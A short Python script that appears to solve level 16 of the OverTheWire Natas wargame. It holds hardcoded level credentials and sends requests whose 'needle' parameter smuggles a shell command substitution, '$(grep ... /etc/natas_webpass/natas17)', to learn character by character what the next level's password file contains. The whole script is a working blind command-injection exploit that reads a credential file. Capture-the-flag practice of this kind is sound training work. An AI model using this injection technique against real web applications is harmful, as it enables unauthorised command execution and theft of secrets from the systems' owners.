import requests
from requests.auth import HTTPBasicAuth  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  



allChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filteredChars = ''

for character in allChars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep ' + character + ' /etc/natas_webpass/natas17)', auth=auth)
    
    if 'Africans' not in r.text:
        filteredChars += character
print(filteredChars)

#     print(requests.get(url, params=parameters, auth=authorization).text)